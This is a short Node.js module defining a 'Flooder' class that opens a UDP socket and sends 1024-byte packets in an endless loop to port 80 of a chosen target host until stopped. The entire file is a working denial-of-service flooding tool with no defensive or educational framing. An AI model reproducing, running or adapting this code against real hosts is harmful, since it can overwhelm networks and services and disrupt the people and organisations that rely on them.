const dgram = require('dgram')
const events = require('events')

module.exports = class Flooder extends events.EventEmitter {
  constructor(targetHost) {
    super()
    this.targetHost = targetHost
    this._flooding = false
    this.client = dgram.createSocket('udp4')
  }

  start() {
    function until(fn) {
      return fn().then(result => {
        if (result) {
          return result
        }
        return until(fn)
      })
    }

    const sendOne = (ip, port) => {
      return new Promise((resolve, reject) => {
        const msg = Buffer.alloc(1024)
        this.client.send(msg, port, ip, () => resolve(!this._flooding))
        this.emit('packet')
      })
    }

    until(() => sendOne(this.targetHost, 80))

    this._flooding = true
  }

  stop() {
    this._flooding = false
  }
}
